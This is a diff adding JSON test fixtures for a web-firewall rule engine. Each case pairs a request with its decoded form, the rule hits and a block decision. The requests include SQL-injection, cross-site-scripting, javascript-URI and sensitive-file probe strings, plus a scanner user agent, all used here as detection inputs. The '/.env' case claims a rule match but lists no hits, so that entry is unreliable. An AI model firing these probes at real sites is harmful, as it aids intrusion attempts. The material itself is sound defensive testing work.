+   "id": "edge-plus",
+   "why": "`+` → 空格（表单编码语义）",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "a=1+2",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a?a=1 2 ",
+    "path": "/a",
+    "query": "a=1 2",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-double-encoded",
+   "why": "双重编码 %2575nion → union（解码要跑两遍）",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "q=%2575nion%2520select",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a?q=union select ",
+    "path": "/a",
+    "query": "q=union select",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [
+    "selftest_double_encoded",
+    "selftest_query_scope",
+    "sqli_union_select"
+   ],
+   "hit_detail": [
+    {
+     "rule": "selftest_double_encoded",
+     "scope": "query",
+     "expect_field": "query"
+    },
+    {
+     "rule": "selftest_query_scope",
+     "scope": "query",
+     "expect_field": "query"
+    },
+    {
+     "rule": "sqli_union_select",
+     "scope": "full",
+     "expect_field": null
+    }
+   ],
+   "weight": 3.0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-unicode-json",
+   "why": "json body 里的 \\\\u003c → <（unicode 阶段）",
+   "req": {
+    "method": "POST",
+    "path": "/api",
+    "query": "",
+    "body": "{\"x\":\"\\u003cscript\\u003ealert(1)\"}",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "POST /api? {\"x\":\"<script>alert(1)\"}",
+    "path": "/api",
+    "query": "",
+    "body": "{\"x\":\"<script>alert(1)\"}",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [
+    "selftest_body_scope",
+    "xss_script_tag"
+   ],
+   "hit_detail": [
+    {
+     "rule": "selftest_body_scope",
+     "scope": "body",
+     "expect_field": "body"
+    },
+    {
+     "rule": "xss_script_tag",
+     "scope": "full",
+     "expect_field": null
+    }
+   ],
+   "weight": 1.5,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-unicode-upper",
+   "why": "\\\\U0001F600（8 位大写 U）",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "",
+    "body": "\\U0001F600",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a? 😀",
+    "path": "/a",
+    "query": "",
+    "body": "😀",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-unicode-lone",
+   "why": "落单代理 \\\\ud83d → U+FFFD（不能崩）",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "",
+    "body": "\\ud83d",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a? �",
+    "path": "/a",
+    "query": "",
+    "body": "�",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-unicode-pair",
+   "why": "代理对 \\\\ud83d\\\\ude00 → 😀",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "",
+    "body": "\\ud83d\\ude00",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a? 😀",
+    "path": "/a",
+    "query": "",
+    "body": "😀",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-unicode-badhex",
+   "why": "\\\\uZZZZ 非法 → 原样保留",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "",
+    "body": "\\uZZZZ",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a? \\uZZZZ",
+    "path": "/a",
+    "query": "",
+    "body": "\\uZZZZ",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-keep-newline",
+   "why": "**body 以换行结尾**：`$` 与 `\\z` 在这里分道扬镳 —— 参考实现把裸 `$` 翻译成 `\\Z` 才与 Rust 一致（见 py_pattern 的注释）",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "",
+    "body": "id=1 --\n",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a? id=1 --\n",
+    "path": "/a",
+    "query": "",
+    "body": "id=1 --\n",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [
+    "sqli_comment_tail"
+   ],
+   "hit_detail": [
+    {
+     "rule": "sqli_comment_tail",
+     "scope": "full",
+     "expect_field": null
+    }
+   ],
+   "weight": 1.0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-comment-tail-nonl",
+   "why": "body 末尾 `--`（不带换行）",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "",
+    "body": "id=1 --",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a? id=1 --",
+    "path": "/a",
+    "query": "",
+    "body": "id=1 --",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [
+    "sqli_comment_tail"
+   ],
+   "hit_detail": [
+    {
+     "rule": "sqli_comment_tail",
+     "scope": "full",
+     "expect_field": null
+    }
+   ],
+   "weight": 1.0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-comment-tail-decoded",
+   "why": "`%2D%2D` 解码成 `--` 后才命中；且 `full` 末尾的拼装空格要吃进 `\\s*`",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "a=1%2D%2D",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a?a=1-- ",
+    "path": "/a",
+    "query": "a=1--",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [
+    "sqli_comment_tail"
+   ],
+   "hit_detail": [
+    {
+     "rule": "sqli_comment_tail",
+     "scope": "full",
+     "expect_field": null
+    }
+   ],
+   "weight": 1.0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-z-anchor-hit",
+   "why": "`\\z` 锚点命中",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "",
+    "body": "run exec",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a? run exec",
+    "path": "/a",
+    "query": "",
+    "body": "run exec",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [
+    "selftest_z_anchor"
+   ],
+   "hit_detail": [
+    {
+     "rule": "selftest_z_anchor",
+     "scope": "body",
+     "expect_field": "body"
+    }
+   ],
+   "weight": 1.0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-z-anchor-miss",
+   "why": "`\\z` 锚点不命中（exec 后还有内容）",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "",
+    "body": "run exec now",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a? run exec now",
+    "path": "/a",
+    "query": "",
+    "body": "run exec now",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-scope-query",
+   "why": "SELECT 只在 query 命中（scope 收窄生效）",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "q=select",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a?q=select ",
+    "path": "/a",
+    "query": "q=select",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [
+    "selftest_query_scope"
+   ],
+   "hit_detail": [
+    {
+     "rule": "selftest_query_scope",
+     "scope": "query",
+     "expect_field": "query"
+    }
+   ],
+   "weight": 1.0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-scope-body-xss",
+   "why": "<script 只在 body 命中",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "",
+    "body": "<script>",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a? <script>",
+    "path": "/a",
+    "query": "",
+    "body": "<script>",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [
+    "selftest_body_scope",
+    "xss_script_tag"
+   ],
+   "hit_detail": [
+    {
+     "rule": "selftest_body_scope",
+     "scope": "body",
+     "expect_field": "body"
+    },
+    {
+     "rule": "xss_script_tag",
+     "scope": "full",
+     "expect_field": null
+    }
+   ],
+   "weight": 1.5,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-scope-ua",
+   "why": "UA 命中给 field=ua",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "",
+    "body": "",
+    "ua": "sqlmap/1.7.2#stable",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a? ",
+    "path": "/a",
+    "query": "",
+    "body": "",
+    "ua": "sqlmap/1.7.2#stable",
+    "referer": ""
+   },
+   "hits": [
+    "selftest_ua_scope"
+   ],
+   "hit_detail": [
+    {
+     "rule": "selftest_ua_scope",
+     "scope": "ua",
+     "expect_field": "ua"
+    }
+   ],
+   "weight": 1.0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-scope-referer",
+   "why": "referer 命中给 field=referer",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "",
+    "body": "",
+    "ua": "",
+    "referer": "https://evil.example/x"
+   },
+   "decoded": {
+    "full": "GET /a? ",
+    "path": "/a",
+    "query": "",
+    "body": "",
+    "ua": "",
+    "referer": "https://evil.example/x"
+   },
+   "hits": [
+    "selftest_referer_scope"
+   ],
+   "hit_detail": [
+    {
+     "rule": "selftest_referer_scope",
+     "scope": "referer",
+     "expect_field": "referer"
+    }
+   ],
+   "weight": 1.0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-block-partial",
+   "why": "只有一条 block 规则命中（0.6 < 1.0 ⇒ 不阻断）",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "zzzblocka",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a?zzzblocka ",
+    "path": "/a",
+    "query": "zzzblocka",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [
+    "selftest_block_a"
+   ],
+   "hit_detail": [
+    {
+     "rule": "selftest_block_a",
+     "scope": "full",
+     "expect_field": null
+    }
+   ],
+   "weight": 0.6,
+   "block_weight": 0.6,
+   "block": false
+  },
+  {
+   "id": "edge-block-full",
+   "why": "两条 block 规则都命中（1.2 >= 1.0 ⇒ 阻断）",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "zzzblocka",
+    "body": "zzzblockb",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a?zzzblocka zzzblockb",
+    "path": "/a",
+    "query": "zzzblocka",
+    "body": "zzzblockb",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [
+    "selftest_block_a",
+    "selftest_block_b"
+   ],
+   "hit_detail": [
+    {
+     "rule": "selftest_block_a",
+     "scope": "full",
+     "expect_field": null
+    },
+    {
+     "rule": "selftest_block_b",
+     "scope": "full",
+     "expect_field": null
+    }
+   ],
+   "weight": 1.2,
+   "block_weight": 1.2,
+   "block": true
+  },
+  {
+   "id": "edge-loud-alert",
+   "why": "**权重 9.0 但 action=alert ⇒ 绝不阻断**（weight=9.0 / block_weight=0.0，旧口径会误判成 block）",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "zzzloud",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a?zzzloud ",
+    "path": "/a",
+    "query": "zzzloud",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [
+    "selftest_loud_alert"
+   ],
+   "hit_detail": [
+    {
+     "rule": "selftest_loud_alert",
+     "scope": "full",
+     "expect_field": null
+    }
+   ],
+   "weight": 9.0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-loud-alert-plus-block",
+   "why": "alert 的大权重 + 一条 block（0.6 < 1.0）⇒ 仍不阻断",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "zzzloud",
+    "body": "zzzblocka",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a?zzzloud zzzblocka",
+    "path": "/a",
+    "query": "zzzloud",
+    "body": "zzzblocka",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [
+    "selftest_block_a",
+    "selftest_loud_alert"
+   ],
+   "hit_detail": [
+    {
+     "rule": "selftest_block_a",
+     "scope": "full",
+     "expect_field": null
+    },
+    {
+     "rule": "selftest_loud_alert",
+     "scope": "full",
+     "expect_field": null
+    }
+   ],
+   "weight": 9.6,
+   "block_weight": 0.6,
+   "block": false
+  },
+  {
+   "id": "edge-nonascii",
+   "why": "非 ASCII 不被破坏",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "q=中文",
+    "body": "身体",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a?q=中文 身体",
+    "path": "/a",
+    "query": "q=中文",
+    "body": "身体",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-js-uri",
+   "why": "xss_js_uri 解码后命中",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "url=javascript%3Aalert(1)",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a?url=javascript:alert(1) ",
+    "path": "/a",
+    "query": "url=javascript:alert(1)",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [
+    "xss_js_uri"
+   ],
+   "hit_detail": [
+    {
+     "rule": "xss_js_uri",
+     "scope": "full",
+     "expect_field": null
+    }
+   ],
+   "weight": 1.0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-path-sensitive",
+   "why": "path_sensitive_file 命中",
+   "req": {
+    "method": "GET",
+    "path": "/.env",
+    "query": "",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /.env? ",
+    "path": "/.env",
+    "query": "",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [],
+   "hit_detail": [],
+   "weight": 0,
+   "block_weight": 0,
+   "block": false
+  },
+  {
+   "id": "edge-tautology",
+   "why": "sqli_tautology 命中",
+   "req": {
+    "method": "GET",
+    "path": "/a",
+    "query": "id=1%20or%20'a'='a'",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "decoded": {
+    "full": "GET /a?id=1 or 'a'='a' ",
+    "path": "/a",
+    "query": "id=1 or 'a'='a'",
+    "body": "",
+    "ua": "",
+    "referer": ""
+   },
+   "hits": [
+    "sqli_tautology"
+   ],
+   "hit_detail": [
+    {
+     "rule": "sqli_tautology",
+     "scope": "full",
+     "expect_field": null
+    }
+   ],
+   "weight": 1.0,
+   "block_weight": 0,
+   "block": false
+  }
+ ]
+}
